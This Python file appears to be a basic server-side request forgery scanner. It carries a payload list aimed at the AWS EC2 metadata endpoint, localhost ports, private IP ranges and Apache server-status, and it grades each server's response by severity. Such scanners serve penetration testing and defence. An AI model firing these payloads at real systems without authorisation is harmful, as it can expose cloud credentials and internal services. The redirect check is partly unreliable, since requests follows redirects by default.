import requests
from urllib.parse import urljoin

# List of common SSRF payloads
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS EC2 metadata endpoint
    "http://127.0.0.1:22",                      # Testing localhost SSH port
    "http://localhost:8080/",                   # Testing common localhost port
    "http://10.0.0.1/",                         # Testing private network IPs
    "http://192.168.1.1/",                      # Testing another private network IP
    "http://example.com:22/",                   # Checking non-standard ports
    "http://localhost/server-status"            # Apache server-status
]

# Function to send the SSRF payload and capture the response
def send_ssrf_payload(url, payload):
    try:
        response = requests.get(url, params={"url": payload}, timeout=10)
        return response
    except requests.RequestException as e:
        print(f"Error while sending SSRF payload: {e}")
        return None

def analyze_ssrf_response(url, payload, response):
    issues = []
    if response:
        if response.status_code == 200:
            if payload == "http://169.254.169.254/latest/meta-data/":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Access to AWS EC2 metadata endpoint indicates exposure of sensitive cloud data.",
                    "severity": "High",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
            elif payload == "http://127.0.0.1:22":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Localhost SSH port (22) is accessible, indicating potential internal exposure.",
                    "severity": "High",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
            elif payload == "http://localhost:8080/":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Internal service on localhost:8080 is accessible, which may expose admin interfaces.",
                    "severity": "Medium",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
            elif payload == "http://10.0.0.1/":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Internal IP (10.x.x.x range) is reachable, posing a risk of network probing.",
                    "severity": "Medium",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
            elif payload == "http://192.168.1.1/":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Access to internal router/admin panel at 192.168.1.1 is possible.",
                    "severity": "Medium",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
            elif payload == "http://example.com:22/":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Non-standard port 22 on example.com is accessible, indicating potential external service exposure.",
                    "severity": "Low",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
            elif payload == "http://localhost/server-status":
                issues.append({
                    "issue": "Server-Side Request Forgery (SSRF)",
                    "description": "Apache server-status page on localhost is accessible, potentially revealing server details.",
                    "severity": "Medium",
                    "details": f"Payload: {payload}, Status Code: {response.status_code}"
                })
        elif response.status_code in [301, 302]:
            redirected_url = response.headers.get('Location', '')
            if redirected_url and redirected_url != payload:
                issues.append({
                    "issue": "Possible SSRF Redirect",
                    "description": f"Server redirected to {redirected_url}, indicating potential SSRF exploitation.",
                    "severity": "Low",
                    "details": f"Payload: {payload}, Redirected URL: {redirected_url}"
                })

    return issues

def scan_ssrf(url, params=None):
    all_issues = []

    for payload in SSRF_PAYLOADS:
        full_url = urljoin(url, payload)
        response = send_ssrf_payload(url, full_url)
        issues = analyze_ssrf_response(url, payload, response)
        if issues:
            all_issues.extend(issues)

    return all_issues
